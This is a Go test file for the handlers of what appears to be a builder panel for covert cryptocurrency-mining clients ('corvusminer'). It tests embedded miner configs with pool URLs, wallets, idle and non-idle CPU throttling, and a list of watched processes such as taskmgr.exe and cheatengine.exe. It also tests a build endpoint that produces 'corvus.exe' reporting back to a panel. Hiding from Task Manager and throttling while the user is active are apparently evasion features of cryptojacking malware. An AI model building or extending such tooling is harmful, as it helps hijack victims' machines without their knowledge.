package handlers

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"corvusminer/panel/models"
)

func samplePanelConfig() *models.Config {
	return &models.Config{
		CPUConfig:        `{"mining_url":"stratum+tcp://pool.example.com:3333","wallet":"CPUWALLET","password":"x","non_idle_usage":50,"idle_usage":20,"wait_time_idle":3,"use_ssl":0}`,
		GPUConfig:        `{"mining_url":"pool.example.com:4444","wallet":"GPUWALLET","password":"x","algo":"pearlhash","fan_speed":80,"wait_time_idle":3,"use_ssl":0}`,
		EnableCPU:        1,
		EnableGPU:        0,
		WatchedProcesses: "taskmgr.exe, cheatengine.exe",
	}
}

func TestBuildEmbeddedDoc(t *testing.T) {
	doc, err := buildEmbeddedDoc(samplePanelConfig())
	if err != nil {
		t.Fatalf("buildEmbeddedDoc: %v", err)
	}
	if !json.Valid([]byte(doc)) {
		t.Fatalf("not valid JSON: %s", doc)
	}

	var decoded struct {
		CPUConfig        map[string]any `json:"cpu_config"`
		GPUConfig        map[string]any `json:"gpu_config"`
		EnableCPU        int            `json:"enable_cpu"`
		EnableGPU        int            `json:"enable_gpu"`
		WatchedProcesses []string       `json:"watched_processes"`
		Timestamp        int64          `json:"timestamp"`
	}
	if err := json.Unmarshal([]byte(doc), &decoded); err != nil {
		t.Fatal(err)
	}

	if decoded.CPUConfig["wallet"] != "CPUWALLET" {
		t.Errorf("cpu wallet = %v", decoded.CPUConfig["wallet"])
	}
	if decoded.GPUConfig["algo"] != "pearlhash" {
		t.Errorf("gpu algo = %v", decoded.GPUConfig["algo"])
	}
	if decoded.EnableCPU != 1 || decoded.EnableGPU != 0 {
		t.Errorf("enable flags = %d/%d", decoded.EnableCPU, decoded.EnableGPU)
	}
	if len(decoded.WatchedProcesses) != 2 || decoded.WatchedProcesses[0] != "taskmgr.exe" {
		t.Errorf("watched = %v", decoded.WatchedProcesses)
	}
	if decoded.Timestamp == 0 {
		t.Error("timestamp missing")
	}

	// The generated fallback must itself pass validation, otherwise a build
	// would refuse its own derived config.
	if err := validateEmbeddedConfigJSON([]byte(doc)); err != nil {
		t.Errorf("derived config rejected by its own validator: %v", err)
	}
}

func TestBuildEmbeddedDocHandlesBrokenPanelConfig(t *testing.T) {
	cfg := samplePanelConfig()
	cfg.CPUConfig = "not json"
	doc, err := buildEmbeddedDoc(cfg)
	if err != nil {
		t.Fatalf("buildEmbeddedDoc: %v", err)
	}
	var decoded map[string]any
	if err := json.Unmarshal([]byte(doc), &decoded); err != nil {
		t.Fatalf("invalid JSON despite broken source: %v", err)
	}
}

func TestValidateEmbeddedConfigJSON(t *testing.T) {
	validCPU := `"cpu_config":{"mining_url":"stratum+tcp://pool.example.com:3333","wallet":"W"}`

	tests := []struct {
		name    string
		body    string
		wantErr string
	}{
		{"valid cpu only", `{` + validCPU + `,"enable_cpu":1}`, ""},
		{"valid with watched", `{` + validCPU + `,"enable_cpu":1,"watched_processes":["a.exe"]}`, ""},
		{"disabled miner is not validated", `{"cpu_config":{"mining_url":"","wallet":""},"enable_cpu":0}`, ""},
		{"empty", ``, "empty"},
		{"not json", `{oops`, "not valid JSON"},
		{"no miners", `{"enable_cpu":1}`, "cpu_config and/or gpu_config"},
		{"bad url", `{"cpu_config":{"mining_url":"pool.example.com","wallet":"W"},"enable_cpu":1}`, "host:port"},
		{"missing wallet", `{"cpu_config":{"mining_url":"pool.example.com:3333","wallet":""},"enable_cpu":1}`, "wallet is required"},
		{"bad watched entry", `{` + validCPU + `,"enable_cpu":1,"watched_processes":[""]}`, "watched_processes"},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateEmbeddedConfigJSON([]byte(tc.body))
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("unexpected error: %v", err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
				t.Fatalf("want error containing %q, got %v", tc.wantErr, err)
			}
		})
	}
}

func TestMaterializeEmbeddedConfigCustom(t *testing.T) {
	h := NewHandler(nil, t.TempDir())
	custom := `{"cpu_config":{"mining_url":"stratum+tcp://pool.example.com:3333","wallet":"WALLET"},"enable_cpu":1}`

	path, cleanup, err := h.materializeEmbeddedConfig(embeddedModeCustom, custom, "")
	if err != nil {
		t.Fatalf("materialize: %v", err)
	}
	defer cleanup()

	if path == "" {
		t.Fatal("expected a temp file for custom mode")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read temp file: %v", err)
	}
	if string(data) != custom {
		t.Errorf("temp file content = %q", data)
	}

	cleanup()
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Error("cleanup should delete the temp file")
	}
}

func TestMaterializeEmbeddedConfigNone(t *testing.T) {
	h := NewHandler(nil, t.TempDir())
	path, cleanup, err := h.materializeEmbeddedConfig(embeddedModeNone, "", "")
	if err != nil || path != "" {
		t.Fatalf("none: path=%q err=%v", path, err)
	}
	cleanup() // must be safe
}

func TestMaterializeEmbeddedConfigRejectsInvalidCustom(t *testing.T) {
	h := NewHandler(nil, t.TempDir())
	if _, _, err := h.materializeEmbeddedConfig(embeddedModeCustom, `{"enable_cpu":1}`, ""); err == nil {
		t.Fatal("expected invalid custom JSON to be rejected")
	}
}

func TestMaterializeEmbeddedConfigLegacyValues(t *testing.T) {
	h := NewHandler(nil, t.TempDir())

	// The old page sent embedded_config: "none"; that must still mean *no*
	// fallback rather than silently embedding the panel config.
	for _, legacy := range []string{"none", "NONE", " false "} {
		path, cleanup, err := h.materializeEmbeddedConfig("", "", legacy)
		if err != nil || path != "" {
			t.Fatalf("legacy %q: path=%q err=%v", legacy, path, err)
		}
		cleanup()
	}

	// Without a database the derived mode cannot render, and must fail loudly
	// rather than silently shipping a client with no fallback.
	for _, legacy := range []string{"", "auto"} {
		if _, _, err := h.materializeEmbeddedConfig("", "", legacy); err == nil {
			t.Fatalf("legacy %q: panel mode without a database should fail", legacy)
		}
	}
}

func TestEmbeddedConfigSaveValidation(t *testing.T) {
	h := NewHandler(nil, t.TempDir())

	cases := []struct {
		name string
		body string
		code int
	}{
		{"bad mode", `{"mode":"weird"}`, http.StatusBadRequest},
		{"invalid json in custom", `{"mode":"custom","json":"{nope"}`, http.StatusBadRequest},
		{"valid custom but no db", `{"mode":"custom","json":"{\"cpu_config\":{\"mining_url\":\"pool.example.com:3333\",\"wallet\":\"W\"},\"enable_cpu\":1}"}`, http.StatusInternalServerError},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rec := httptest.NewRecorder()
			req := httptest.NewRequest(http.MethodPost, "/api/build/embedded-config", strings.NewReader(tc.body))
			h.EmbeddedConfigSave(rec, req)
			if rec.Code != tc.code {
				t.Errorf("status = %d, want %d (%s)", rec.Code, tc.code, rec.Body.String())
			}
		})
	}
}

func TestEmbeddedConfigGetDefaultsToPanel(t *testing.T) {
	h := NewHandler(nil, t.TempDir())
	rec := httptest.NewRecorder()
	h.EmbeddedConfigGet(rec, httptest.NewRequest(http.MethodGet, "/api/build/embedded-config", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d", rec.Code)
	}
	var payload embeddedConfigPayload
	if err := json.Unmarshal(rec.Body.Bytes(), &payload); err != nil {
		t.Fatal(err)
	}
	if payload.Mode != embeddedModePanel {
		t.Errorf("default mode = %q, want panel", payload.Mode)
	}
}

// TestBuildMinerEmbedsCustomFallback checks the whole path: the posted JSON is
// written to a temp file and that path is handed to the builder.
func TestBuildMinerEmbedsCustomFallback(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake builder requires a POSIX shell")
	}

	captured := filepath.Join(t.TempDir(), "embedded.json")
	script := `#!/bin/sh
out=""; name="corvus.exe"; embedded=""
while [ $# -gt 0 ]; do
  case "$1" in
    -output) out="$2"; shift 2;;
    -name) name="$2"; shift 2;;
    -embedded-config) embedded="$2"; shift 2;;
    *) shift;;
  esac
done
printf '%s' "$embedded" > ` + captured + `.path
if [ -f "$embedded" ]; then cp "$embedded" ` + captured + `; fi
mkdir -p "$out"
printf 'MZfake' > "$out/$name"
printf '{"success":true,"output":"%s/%s","bytes":6,"sha256":"abc","duration_ms":1}' "$out" "$name"
`
	h, _ := newTestHandler(t, script)

	custom := `{"cpu_config":{"mining_url":"stratum+tcp://pool.example.com:3333","wallet":"WALLET"},"enable_cpu":1}`
	body, err := json.Marshal(map[string]any{
		"panel_urls":    "https://p.example/api/miners/submit",
		"embedded_mode": "custom",
		"embedded_json": custom,
	})
	if err != nil {
		t.Fatal(err)
	}

	rec := httptest.NewRecorder()
	h.BuildMiner(rec, httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(string(body))))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d (%s)", rec.Code, rec.Body.String())
	}

	gotPath, err := os.ReadFile(captured + ".path")
	if err != nil {
		t.Fatalf("builder did not receive -embedded-config: %v", err)
	}
	if !strings.HasSuffix(string(gotPath), ".json") {
		t.Errorf("embedded path = %q, want a temp .json file", gotPath)
	}
	content, err := os.ReadFile(captured)
	if err != nil {
		t.Fatalf("builder could not read the fallback file: %v", err)
	}
	if string(content) != custom {
		t.Errorf("embedded content = %q, want %q", content, custom)
	}
	if _, err := os.Stat(string(gotPath)); !os.IsNotExist(err) {
		t.Error("temp fallback file should be removed after the build")
	}
}
